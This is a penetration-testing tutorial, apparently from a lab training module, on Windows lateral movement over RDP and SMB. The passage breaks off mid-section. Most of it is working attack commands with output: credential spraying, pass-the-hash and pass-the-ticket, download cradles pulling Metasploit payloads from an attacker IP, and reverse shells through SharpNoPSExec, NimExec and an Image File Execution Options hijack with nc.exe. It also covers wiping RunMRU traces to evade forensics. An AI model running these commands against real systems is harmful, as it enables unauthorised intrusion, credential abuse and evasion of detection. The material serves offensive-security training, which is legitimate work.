# Windows Lateral Movement

## Introduction

Lateral Movement refers to the techniques you use to move through a network after gaining initial access. By understanding lateral movement, attackers and defenders can better navigate and secure networks. This knowledge allows defenders to implement more effective security measures and helps attackers identify and exploit weaknesses in network defenses, ultimately leading to a more robust and resilient security posture.

It involves moving from one system to another within a network, often with the goal of escalating privileges or accessing sensitive data. Using lateral movement techniques, you can move deeper into a network in search of credentials, sensitive data, and other high-value assets.

To perform a lateral movement, you need any form of credentials, including passwords, hashes, tickets, SSH keys, and session cookies. You can leverage those to connect to a remote computer in the network. Effective lateral movement requires a deep understanding of network architectures and the ability to identify services and protocols you can leverage to execute code on remote systems.

### Networks & Systems

Understanding how networks and systems work is crucial to performing lateral movement. Your initial step is to identify or map the network devices that you can target; you can do that through port scanning, ping sweep, or using AD information.

Once you understand the network, you need to be aware that some systems may be out of reach because of network segmentation or firewall restrictions. In those cases, you need to think outside the box to get access to those services.

#### Direct Lateral Movement

... is where you can execute commands directly on the target machine and force the target machine to connect back to you. For example, if you compromise SRV01 and need to move laterally to SRV02, you can use PSExec from SRV01 to execute commands on SRV02 and obtain a session or shell on SRV02.

![windows lateral movement 1](../../../images/windows_lateral_movement1.png)

#### Indirect Lateral Movement

... involves executing commands on the target machine when it receives instructions from another system. For example, suppose you can't reach SRV02 directly from SRV01 due to a network firewall restriction, but SRV02 can connect to the Windows Update Server. In this case, if you compromise the WSUS server and create a fake Windows Update that executes your desired command, once SRV02 retrieves the update, it will run your malicious update, allowing you to obtain a shell on SRV02.

![windows lateral movement 2](../../../images/windows_lateral_movement2.png)

### Network Segmentation


Understanding network segmentation is crucial for effectively performing lateral movement as attackers. Network segmentation involves dividing a network into smaller, isolated segments to limit the spread of an attack. Proper network segmentation can:

- **Contain breaches**: Restrict your movement and reduce the attack surface.
- **Enhance monitoring**: Allow for more focused and effective monitoring of network traffic.
- **Improve access control**: Enforce strict access policies between different segments.

![windows lateral movement 3](../../../images/windows_lateral_movement3.png)

In the above image, you can see a high-level overview of the network topology. There are three network segments, and the device that determines which network can reach the other is the Switch Layer 3. In other networks, this device can be a router, a Linux server, or a firewall. Understanding how these devices control communication between segments is essential for planning lateral movement.

## Remote Services

### RDP

#### Rights

The required rights to connect to RDP depend on the configuration; by default, only members of the `Administrators` or `Remote Desktop Users` groups can connect via RDP. Additionally, an administrator can grant specific users or groups rights to connect to RDP. Because those rights are set locally, the only way to enumerate them is if you have administrative rights on the target computer.

#### Enum

To use RDP for lateral movement you need to be aware if RDP is present on the environment you are testing, you can use nmap or any other network enumeration tool to search for port 3389 and once you get a list of targets, you can use that list with tools such as NetExec to test multiple credentials.

```bash
d41y@htb[/htb]$ netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local
RDP         10.129.229.242  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:DC01) (nla:True)
RDP         10.129.229.244  3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:SRV01) (nla:True)
RDP         10.129.229.242  3389   DC01             [-] inlanefreight.local\helen:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
...SNIP...
```

You can confirm Helen has RDP rights on SRV01. Remeber that `Pwn3d!` doesn't mean you have administrative rights on the target machine but that you have rights to connect to RDP.

#### Lateral Movement from Windows

To connect to RDP from Windows you can use the default Windows Remote Desktop Connection client that can be accessed running `mstsc` on Run, CMD, or PowerShell.

```
C:\Tools> mstsc.exe
```

This will open a client where you can specify the target IP address or domain name, and one you click `Connect`, it will prompt you for the credentials.

![windows lateral movement 4](../../../images/windows_lateral_movement4.png)

Here are some actions that can be efficiently executed using RDP:

- File Transfer
- Running Applications
- Printing
- Audio and Video Streaming
- Clipboard Sharing

#### Lateral Movement from Linux

To connect to RDP from Linux, you can use the `xfreerdp` command-line tool.

```bash
d41y@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

By running this command in the terminal, you can establish an RDP connection to the specified Windows machine and perform similar actions as you would using the Windows Remote Desktop Connection client.

##### Optimizing xfreerdp for Low Latency Networks or Proxy Connections

```bash
d41y@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
- `/compression`: Enables compression to reduce the amount of data sent over the network.
- `-themes`: Disables desktop themes to reduce graphical data.
- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
- `/clipboard`: Enables clipboard sharing between the local and remote machines.
- `/audio-mode:0`: Disables audio redirection to save bandwidth.
- `/auto-reconnect`: Automatically reconnects if the connection drops, improving session stability.
- `-glyph-cache`: Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering.

Using these options helps to optimize the performance of the RDP session, ensuring a smoother experience even in less-than-ideal network conditions.

#### Restricted Admin Mode

... is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote systems. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

Although this mode prevents the caching of credentials, if enabled, it allows the execution of PtH or PtT for lateral movement.

To confirm if `Restricted Admin Mode` is enabled, you can query the following registry key:

```
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- 0 means enabled
- 1 means disabled

If the key does not exist it means that it is disabled; you will see the following error message:

```
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

ERROR: The system was unable to find the specified registry key or value.
```

Additionally, to enable `Restricted Admin Mode`, you would set the `DisableRestrictedAdmin` value to `0`:

```
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:

```
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

#### Pivoting

It is common that you will need to use pivoting to perform lateral movement.

You will need to configure a SOCKS5 proxy on port 1080 in the `/etc/proxychains.conf` file:

```bash
d41y@htb[/htb]$ cat /etc/proxychains.conf | grep -Ev '(^#|^$)' | grep socks
socks5 127.0.0.1 1080
```

Next, on your Linux machine, you will initiate reverse port forwarding server:

```bash
d41y@htb[/htb]$ ./chisel server --reverse 
2024/03/28 07:09:08 server: Reverse tunnelling enabled
2024/03/28 07:09:08 server: Fingerprint AKOstLSoSTPQPp2PVEALM6z9Jx0IQVEEmO7bOSan1s4=
2024/03/28 07:09:08 server: Listening on http://0.0.0.0:8080
2024/03/28 07:10:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Then, in SRV01, you will connect to the server with the following command: `chisel.exe client <VPN IP> R:socks`

```powershell
PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
```

#### PtH and PtT

Once you confirm `Restricted Admin Mode` is enabled, or if you can enable it, you can proceed to perform PtH or PtT attacks with RDP.

To perform PtH from a Linux machine, you can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP.

```bash
d41y@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
```

For PtT you can use Rubeus. You will forge a ticket using Helen's hash. First you need to launch a sacrificial process with the option `createnetonly`:

```powershell
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
```

In the new PowerShell window you will use Helen's hash to forge a TGT:

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 62EBA30320E250ECA185AA1327E78AEB
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\helen'
[*] Using domain controller: fe80::711d:1399:b85a:50c5%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFrjCCBaqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      ...SNIP...

[+] Ticket successfully imported!
...SNIP...
```

From the window where you imported the ticket, you can use the `mstsc /restrictedAdmin` command:

```powershell
PS C:\Tools> mstsc.exe /restrictedAdmin
```

It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account you are trying to impersonate.

![windows lateral movement 5](../../../images/windows_lateral_movement5.png)

When you click login, it will allow you to connect to RDP using the hash:

![windows lateral movement 6](../../../images/windows_lateral_movement6.png)

#### SharpRDP

... is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.

SharpRDP relies on the terminal services library and generates the required DLLs from the `mstscax.dll`. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.

You will use Metasploit and PowerShell to execute commands on the target machine. In your Linux machine you will execute Metasploit to listen on port 8888:

```bash
d41y@htb[/htb]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

Then you will generate a payload with msfvenom using PowerShell reflection:

```bash
d41y@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 774 bytes
Final size of psh-reflection file: 3543 bytes
Saved as: s
```

Next you use Python http server to host your payload:

```bash
d41y@htb[/htb]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now you can use SharpRDP to execute a PowerShell command to execute your payload and provide a session:

```powershell
PS C:\Tools> .\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
[+] Connected to          :  srv01
[+] Execution priv type   :  non-elevated
[+] Executing powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.207/s')
[+] Disconnecting from    :  srv01
[+] Connection closed     :  srv01
```

> [!NOTE]
> The execution of commands of SharpRDP is limited to 259 chars.

SharpRDP uses Microsoft Terminal Services to execute commands, leaving traces of command execution within the `RunMRU` registry key (_`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` or `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`_). You can use [CleanRUNMR](https://github.com/0xthirteen/CleanRunMRU) to clean all command records. To compile the tool, you can use the built-in Microsoft `csc` compiler tool. First, transfer CleanRunMRU's `Program.cs` file from your attack host to the target computer:

```powershell
PS C:\Tools> wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
```

Now you can use `csc.exe` to compile it:

```powershell
PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Now you can use `CleanRunMRU.exe` to clear all commands:

```powershell
PS C:\Tools> .\CleanRunMRU.exe  clearall
HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
[+] Cleaned all RunMRU values
```

#### Advantages

RDP provides several advantages for lateral movement, making it a preferred method for attackers in certain scenarios. Some of the key advantages include:

- **Evade detection**: RDP traffic is common in business environments, making it less likely to raise suspicion.
- **Non-Admin Access**: RDP access does not necessarily require administrative rights; a non-admin user can also have RDP access.
- **Persistent Access**: Once a foothold is established, RDP can provide persistent access to the network.

### SMB

#### Rights

For successful SMB lateral movement, you require an account that is a member of the Administrators group on the target computer. It's also crucial that ports TCP 445 and TCP 139 are open. Optionally, port TCP 135 may also need to be open because some tools use it for communication.

##### UAC Remote Restrictions

UAC might prevent you from achieving RCE, but understanding these restrictions is crucial for effectively leveraging these tools while navigating UAC limitations on different versions of Windows, these restrictions imply several key points:

- Local admin privileges are necessary.
- Local admin accounts that are not RID 500 cannot run tools such as PsExec on Windows Vista and later.
- Domain users with admin rights on a machine can execute tools such as PsExec.
- RID 500 local admin accounts can utilize tools such as PsExec on machines.

##### SMB Named Pipes

Named pipes in SMB, accessed via the `IPC$` share over TCP port 445, are vital for lateral movement within a network. They enable a range of operations from NULL session context to those requiring local administrative privileges. For instance, `svcctl` facilitates the remote creation, starting, and stopping of services to execute commands, as seen in tools like Impacket's `psexec.py` and `smbexec.py`. `atsvc` supports the remote creation of scheduled tasks for command execution, utilized by Impacket's `atexec.py`. These named pipes are crucial for executing and managing lateral movement operations effectively. `winreg` provides a remote access to the Windows registry, allowing to query and modify registry keys and values, helping in the persistence and configuration of malicious payloads.

#### Enum

You need to ensure that SMB is running on the target host.

You must conduct a port scan on the target host to verify whether SMB is running on the target. By default, SMB uses ports TCP 139 and TCP 445.

```bash
d41y@htb[/htb]$ proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-08 04:07 UTC
Nmap scan report for srv01.internal.cloudapp.net (172.20.0.51)
Host is up (0.0016s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: SRV02, NetBIOS user: <unknown>, NetBIOS MAC: 00:0d:3a:e2:38:3d (Microsoft)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-08T04:07:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.65 seconds
```

#### Lateral Movement from Windows

##### PSExec

PSExec is included in Microsoft's Sysinternals suite, a collection of tools designed to assist administrators in system management tasks. This tool facilitates RCE and retrieves output over a named pipe using the SMB protocol, operating on TCP port 445 and TCP port 139.

By default, PSExec performs the following action:

1. Establish a link to the hidden `ADMIN$` share, which corresponds to the `C:\Windows` directory on the remote system, via SMB.
2. Uses the Service Control Manager (_SMC_) to initiate the `PsExecsvc` service and set up a named pipe on the remote system.
3. Redirects the console's input and output through the created named pipe for interactive command execution.

> [!INFO]
> PsExec eliminates the double-hop problem because credentials are passed with the command and generates an interactive logon session.

You can use PsExec to connect to a remote host and execute commands interactively. You mus specify the computer or target where you are connecting `\\SRV02`, the option `-i` for interactive shell, the administrator login credentials with the option `-u <user>` and the password `-p <password>`, and `cmd` to specify the application to execute:

```
C:\Tools\SysinternalsSuite> .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd
PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
inlanefreight\helen
SRV02
```

In case you want to execute your payload as `NT AUTHORITY\SYSTEM`, you need to specify the option `-s` which means that it will run with SYSTEM privileges.

```powershell
PS C:\Tools> .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

##### [SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec)

... is a tool designed to facilitate lateral movement by leveraging existing services on a target system without creating new ones or writing to disk, thus minimizing detection risk. The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker's choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag.

Executing the tool without parameters you will see some help and usage information.

```powershell
PS C:\Tools> .\SharpNoPSExec.exe

███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████╗███████║███████║██████╔╝██████╔╝██╔██╗ ██║██║   ██║██████╔╝███████╗█████╗   ╚███╔╝ █████╗  ██║
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██║╚██╗██║██║   ██║██╔═══╝ ╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██║
███████║██║  ██║██║  ██║██║  ██║██║     ██║ ╚████║╚██████╔╝██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝

Version: 0.0.3
Author: Julio Ureña (PlainText)
Twitter: @juliourena

Usage:
SharpNoPSExec.exe --target=192.168.56.128 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="

Required Arguments:
--target=       - IP or machine name to attack.
--payload=      - Payload to execute in the target machine.

Optional Arguments:
--username=     - Username to authenticate to the remote computer.
--password=     - Username's password.
--domain=       - Domain Name, if no set a dot (.) will be used instead.

--service=      - Service to modify to execute the payload, after the payload is completed the service will be restored.
Note: If not service is specified the program will look for a random service to execute.
Note: If the selected service has a non-system account this will be ignored.

--help          - Print help information.
```

To perform lateral movement with SharpNoPSExec, you will need a listener as this tool will only allow you to execute code on the machine, but it won't give you an interactive shell as PsExec does. You can start listening with Netcat:

```bash
d41y@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

SharpNoPSExec uses the credentials of the console you are executing the command from, so you need to make sure to launch it from a console that has the correct credentials. Alternatively, you can use the arguments `--username`, `--password` and `--domain`. Additionally, you have to provide the target IP address or the domain name `--target=<IP/DOMAIN>`, and the command you want to execute. For the command, you can use the payload in the help menu to set your reverse shell `--payload="c:\windows\system32\cmd.exe /c <reverseShell>`.

```powershell
PS C:\Tools> .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

[>] Open SC Manager from 172.20.0.52.

[>] Getting services information from 172.20.0.52.

[>] Looking for a random service to execute our payload.
    |-> Querying service NetTcpPortSharing
    |-> Querying service UevAgentService
    |-> Service UevAgentService authenticated as LocalSystem.

[>] Setting up payload.
    |-> payload = c:\windows\system32\cmd.exe /c ...SNIP...AbwBzAGUAKAApAA==
    |-> ImagePath previous value = C:\Windows\system32\AgentService.exe.
    |-> Modifying ImagePath value with payload.

[>] Starting service User Experience Virtualization Service with new ImagePath.

[>] Waiting 5 seconds to finish.

[>] Restoring service configuration.
    |-> User Experience Virtualization Service Log On => LocalSystem.
    |-> User Experience Virtualization Service status => 4.
    |-> User Experience Virtualization Service ImagePath => C:\Windows\system32\AgentService.exe
```

Looking at the attack box, you can see the reverse shell connection successfully being established:

```bash
d41y@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 49866

PS C:\Windows\system32>
```

##### [NimExec](https://github.com/frkngksl/NimExec)

... is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (_MS-SCMR_). Instead of using traditional WinAPI calls, NimExec manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over SMB and the `svcctl` named pipe. Authentication is handled using NTLM hash, which NimExec utilizes to complete the process via the NTLM Authentication method over its custom packets. By manually crafting the necessary network packets and avoiding OS-specific functions, this tool benefits from Nim's cross-compilation capabilities, making it versatile across different OS.

NimExec requires the Nim Programming Language. The tool requires the `ptr_math`, `nimcrypto`, and `hostname` modules.

```bash
d41y@htb[/htb]$ sudo apt update
d41y@htb[/htb]$ sudo apt install nim
d41y@htb[/htb]$ git clone https://github.com/frkngksl/NimExec
d41y@htb[/htb]$ cd NimExec/
d41y@htb[/htb]$ nimble install ptr_math nimcrypto hostname
```

If you try to compile the NimExec executable, you may encounter an error in the file `~/.nimble/pkgs/nimcrypto-0.7.2/nimcrypto/hmac.nim` related to the import of `hash`, `utils`, `cpufeatures`. One way to fix that error is to change line `61` from `import ./[hash, utils, cpufeatures]` to `import hash, utils, cpufeatures` and save the file.

After saving the file, you compile the executable with Nim, specifying release mode (`-d:release`), the garbage collector (`--gc:markAndSweep`), the CPU architecture (`--cpu:amd64`), the cross-compilation target (`--os:windows`), the C compiler (`--cc:gcc`), the exact GCC binary to use ( `--gcc.exe:x86_64-w64-mingw32-gcc`), the linker (`--gcc.linker.exe:x86_64-w64-mingw32-gcc`), the output filename (`-o:NimExec.exe`), and the source file to compile (`Main.nim`).

```bash
d41y@htb[/htb]$ nim c -d:release --gc:markAndSweep --cpu:amd64 --os:windows --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -o:NimExec.exe Main.nim

Hint: used config file '/etc/nim/nim.cfg' [Conf]
Hint: used config file '/etc/nim/config.nims' [Conf]

<SNIP>

CC: ../.nimble/pkgs/nimcrypto-0.7.2/nimcrypto/hmac.nim
CC: ../.nimble/pkgs/nimcrypto-0.7.2/nimcrypto/sysrand.nim
CC: HeaderFillers.nim
CC: Packets.nim
CC: Main.nim
Hint:  [Link]
Hint: gc: markAndSweep; opt: speed; options: -d:release
68150 lines; 6.566s; 181.035MiB peakmem; proj: /home/htb-student/NimExec/Main.nim; out: /home/htb-student/NimExec/NimExec.exe [SuccessX]
```

Running the tool without parameters give you some commands and descriptions to let you know how to use it.

```powershell
PS C:\Tools> .\NimExec.exe

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[!] Missing one or more arguments!
[!] Error unknown or missing parameters!

    -v | --verbose                          Enable more verbose output.
    -u | --username <Username>              Username for NTLM Authentication.*
    -h | --hash <NTLM Hash>                 NTLM password hash for NTLM Authentication.**
    -p | --password <Password>              Plaintext password.**
    -t | --target <Target>                  Lateral movement target.*
    -c | --command <Command>                Command to execute.*
    -d | --domain <Domain>                  Domain name for NTLM Authentication.
    -s | --service <Service Name>           Name of the service instead of a random one.
    --help                                  Show the help message.
```

NimExec works similarily to SharpNoPSExec. Start your listener:

```bash
d41y@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
```

To execute NimExec, you must specify the administrator credentials with the options `-u <user>`, `-p <password>` and `-d <domain>`, and the target IP address `-t <ip>`. Alternatively, you can use the NTLM hash for authentication `-h <NT hash>` instead of the password. Finally, you must specify the payload to execute with the option `-c <cmd.exe> /c <reverseShell>`. You can generate the reverse shell payload using revshells.com, and to convert the plain text password to NTLM hash, you can use this [recipe](https://gchq.github.io/CyberChef/#recipe=NT_Hash()) in CyberChef.

```powershell
PS C:\Tools> .\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[+] Connected to 172.20.0.52:445
[+] NTLM Authentication with Hash is succesfull!
[+] Connected to IPC Share of target!
[+] Opened a handle for svcctl pipe!
[+] Binded to the RPC Interface!
[+] RPC Binding is acknowledged!
[+] SCManager handle is obtained!
[+] Number of obtained services: 208
[+] Selected service is AppMgmt
[+] Service: AppMgmt is opened!
[+] Previous Service Path is: C:\Windows\system32\svchost.exe -k netsvcs -p
[+] Service config is changed!
[!] StartServiceW Return Value: 1053 (ERROR_SERVICE_REQUEST_TIMEOUT)
[+] Service start request is sent!
[+] Service config is restored!
[+] Service handle is closed!
[+] Service Manager handle is closed!
[+] SMB is closed!
[+] Tree is disconnected!
[+] Session logoff!
```

Once you execute the tool with the above parameters, you are going to succesfully establish a reverse shell connection:

```bash
d41y@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

PS C:\Windows\system32>
```

##### Reg.exe

Having remote access to the registry with write permissions effectively provides RCE capabilities. This process utilizes the `winreg` SMB pipe. Typically, the remote registry service is enabled by default only on server-class OS.

You can leverage the program launch handler to move laterally on the network, modifying a registry key to a program frequently used on the target host; you could achieve RCE almost immediately.

Before proceeding with `reg.exe` for lateral movement, you must set up an SMB server to host your payload. You will be using `nc.exe` as your payload to get a revshell:

```bash
d41y@htb[/htb]$ sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In your attack host you execute your listener:

```bash
d41y@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

Now, you can execute `reg.exe` to add a new registry key to Microsoft Edge (`msedge.exe`). The idea is that once `msedge.exe` is executed, it will also execute your specified payload. You must specify the full path of the subkey or the entry to be added with the domain name `dd \\<domain>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe`. `/v Debugger` specifies the name of the add registry entry and will ensure that your payload gets executed, `/t reg_sz` specifies the datatype of a Null-terminated string, and finally, you can type of your payload `/d <payload>`:

```powershell
PS C:\Tools> reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

The operation completed successfully.
```

Once Microsoft Edge is opened by any user in the domain, you will instantly get a reverse shell:

```bash
d41y@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

C:\Program Files (x86)\Microsoft\Edge\Application>
```

It is important to keep in mind that to use SMB share folder without authentication you need to have the following registry key set to `1`:

```powershell
